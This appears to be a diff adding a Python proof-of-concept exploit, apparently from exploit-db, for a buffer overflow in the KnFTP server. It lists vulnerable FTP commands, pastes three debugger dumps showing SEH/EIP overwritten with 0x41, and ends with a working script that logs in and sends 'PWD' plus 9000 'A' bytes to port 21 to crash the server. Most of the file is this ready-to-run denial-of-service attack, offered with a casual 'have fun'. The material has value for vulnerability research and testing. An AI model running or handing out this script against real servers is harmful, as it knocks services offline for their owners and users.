@@ -1,0 +1,130 @@
+#!/usr/bin/python
+
+# Title: KnFTP Server Buffer Overflow Exploit (DoS PoC)
+# From: The eh?-Team || The Great White Fuzz (we're not sure yet)
+# Found by: loneferret (kinda)
+# Bug that made me fuzz this app by Blake: http://www.exploit-db.com/exploits/17819/
+
+# Date Found: Sept 18th 2011
+# Tested on: Windows XP SP2/SP3 Professional (DEP off)
+# Nod to the Exploit-DB Team
+ 
+# Vulnerable commands: MKD / LS / ABOR / CD / APPE / REST / PWD
+# So it just looks like all this app's commands are vulnerable. Even commands
+# that the server doesn't support. SEH and/or EIP gets overwriten. 
+# It's almost like this application was made to be vulnerable.
+# Anyway have fun.
+
+#EAX 7EFEFEFE
+#ECX 00C7EFFC ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+#EDX 41414141
+#EBX 00C7FE92 ASCII "MKD"
+#ESP 00C7CD94
+#EBP 00C7CDC4
+#ESI 00C7FE9C ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+#EDI 00C7FFFE
+#EIP 77C460C1 msvcrt.77C460C1
+#C 0  ES 0023 32bit 0(FFFFFFFF)
+#P 1  CS 001B 32bit 0(FFFFFFFF)
+#A 0  SS 0023 32bit 0(FFFFFFFF)
+#Z 1  DS 0023 32bit 0(FFFFFFFF)
+#S 0  FS 003B 32bit 7FFDE000(FFF)
+#T 0  GS 0000 NULL
+#D 0
+#O 0  LastErr ERROR_SUCCESS (00000000)
+#EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+#ST0 empty 0.00000000000000000000
+#ST1 empty 0.00000000000000000000
+#ST2 empty 2.1219957909652723000e-314
+#ST3 empty 0.00000000000000000000
+#ST4 empty 0.00000000000000000000
+#ST5 empty 0.00000000000000000000
+#ST6 empty 0.00000000000000000000
+#ST7 empty 1.2519775166695107000e-312
+#               3 2 1 0      E S P U O Z D I
+#FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+#FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+#EAX 7EFEFEFE
+#ECX 00C7EFFC ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAA...
+#EDX 41414141
+#EBX 00C7FE92 ASCII "LS"
+#ESP 00C7CD94
+#EBP 00C7CDC4
+#ESI 00C7FE9C ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAA...
+#EDI 00C7FFFF
+#EIP 77C460C1 msvcrt.77C460C1
+#C 0  ES 0023 32bit 0(FFFFFFFF)
+#P 1  CS 001B 32bit 0(FFFFFFFF)
+#A 0  SS 0023 32bit 0(FFFFFFFF)
+#Z 1  DS 0023 32bit 0(FFFFFFFF)
+#S 0  FS 003B 32bit 7FFDE000(FFF)
+#T 0  GS 0000 NULL
+#D 0
+#O 0  LastErr ERROR_SUCCESS (00000000)
+#EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+#ST0 empty 0.00000000000000000000
+#ST1 empty 0.00000000000000000000
+#ST2 empty 2.1219957909652723000e-314
+#ST3 empty 0.00000000000000000000
+#ST4 empty 0.00000000000000000000
+#ST5 empty 0.00000000000000000000
+#ST6 empty 0.00000000000000000000
+#ST7 empty 1.2519775166695107000e-312
+#               3 2 1 0      E S P U O Z D I
+#FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+#FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+#SEH chain of thread 000001BC, item 0
+#Address=00C7FFDC
+#SE handler=41414141
+
+#EAX 7EFEFEFE
+#ECX 00C7EFFC ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAA...
+#EDX 41414141
+#EBX 00C7FE92 ASCII "ABOR"
+#ESP 00C7CD94
+#EBP 00C7CDC4
+#ESI 00C7FE9C ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAA...
+#EDI 00C7FFFD
+#EIP 77C460C1 msvcrt.77C460C1
+#C 0  ES 0023 32bit 0(FFFFFFFF)
+#P 1  CS 001B 32bit 0(FFFFFFFF)
+#A 0  SS 0023 32bit 0(FFFFFFFF)
+#Z 1  DS 0023 32bit 0(FFFFFFFF)
+#S 0  FS 003B 32bit 7FFDD000(FFF)
+#T 0  GS 0000 NULL
+#D 0
+#O 0  LastErr ERROR_SUCCESS (00000000)
+#EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+#ST0 empty 0.00000000000000000000
+#ST1 empty 0.00000000000000000000
+#ST2 empty 2.1219957909652723000e-314
+#ST3 empty 0.00000000000000000000
+#ST4 empty 0.00000000000000000000
+#ST5 empty 0.00000000000000000000
+#ST6 empty 0.00000000000000000000
+#ST7 empty 1.2519775166695107000e-312
+#               3 2 1 0      E S P U O Z D I
+#FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
+#FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+
+
+import socket
+ 
+ 
+buffer = "\x41" * 9000
+ 
+ 
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+connect=s.connect(('xxx.xxx.xxx.xxx',21))
+s.recv(1024)
+s.send('USER test\r\n')
+s.recv(1024)
+s.send('PASS test\r\n')
+s.recv(1024)
+s.send('PWD ' + buffer + '\r\n')
+s.recv(1024)
+s.send('QUIT\r\n')
+s.close
